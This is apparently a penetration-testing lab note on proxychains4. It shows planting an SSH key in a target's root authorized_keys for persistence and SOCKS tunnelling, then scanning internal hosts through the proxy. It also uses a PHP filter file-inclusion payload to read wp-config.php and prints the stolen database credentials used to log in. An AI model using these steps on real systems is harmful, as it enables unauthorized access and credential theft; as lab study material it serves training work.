# 💢 proxychains4
Tags: #💢
Related to: 
See also: 
Previous: [[Post Exploitation]], [[Tunneling & Exfiltration]]

---
## Description

Redirect connections through proxy servers.

## Usage Examples

### Upgrade to SSH shell and tunnel

Edit /etc/proxychains4.conf file to proxy requests through SOCKS port 1080:

	socks5 127.0.0.1 1080

Add your public key to the target and upgrade to SSH shell:

	ssh-keygen -b 4096								// create key in ~/.ssh/
	cat ~/.ssh/id_rsa.pub							// add this to target /root/.ssh/authorized_keys
																								// and if you created authorized_keys, ensure that the
																								// permissions are root:root and chmod 700.
	ssh -i ~/.ssh/id_rsa -D 1080 root@10.10.110.100	// root@DANTE-WEB-NIX01



nmap through proxychains:

```
Note: nmap SYN scan is not proxy aware and there is limited support for the Nmap --proxies option. Instead, we can use a TCP Connect Scan (-sT), which uses the OS to issue a higher-level connect system call that routes the traffic through the proxy.
```

	proxychains nmap 172.16.1.10 -sT -sV -Pn -T5

```
Nmap scan report for 172.16.1.10
Host is up, received user-set (0.11s latency).
Scanned at 2021-12-25 16:43:34 EST for 115s
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

	proxychains firefox http://172.16.1.10
	
	proxychains curl "172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d > wp-config.php

```
/ ** MySQL settings - You can get this info from your web host ** //
/ ** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );
```

	proxychains ssh margaret@172.16.1.10

### Enumerate files and  directories through proxychains

	gobuster dir --proxy socks5://127.0.0.1:1080 --url http://172.16.1.13/ -w /usr/share/wordlists/dirb/common.txt

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.1.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/26 15:33:37 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 1043]
/.htpasswd            (Status: 403) [Size: 1043]
/.htaccess            (Status: 403) [Size: 1043]
/aux                  (Status: 403) [Size: 1043]
/cgi-bin/             (Status: 403) [Size: 1057]
/com1                 (Status: 403) [Size: 1043]
/com2                 (Status: 403) [Size: 1043]
/com3                 (Status: 403) [Size: 1043]
/con                  (Status: 403) [Size: 1043]
/dashboard            (Status: 301) [Size: 338] [--> http://172.16.1.13/dashboard/]
/discuss              (Status: 301) [Size: 336] [--> http://172.16.1.13/discuss/]  
/favicon.ico          (Status: 200) [Size: 30894]                                  
/examples             (Status: 503) [Size: 1057]                                   
/img                  (Status: 301) [Size: 332] [--> http://172.16.1.13/img/]      
/index.php            (Status: 302) [Size: 0] [--> http://172.16.1.13/dashboard/]  
/licenses             (Status: 403) [Size: 1202]                                   
/lpt1                 (Status: 403) [Size: 1043]                                   
/lpt2                 (Status: 403) [Size: 1043]                                   
/nul                  (Status: 403) [Size: 1043]                                   
/phpmyadmin           (Status: 403) [Size: 1202]                                   
/prn                  (Status: 403) [Size: 1043]                                   
/server-info          (Status: 403) [Size: 1202]                                   
/server-status        (Status: 403) [Size: 1202]                                   
/webalizer            (Status: 403) [Size: 1043]                                   
                                                                                   
===============================================================
2021/12/26 15:34:10 Finished
===============================================================
```

---
## References
- [[]]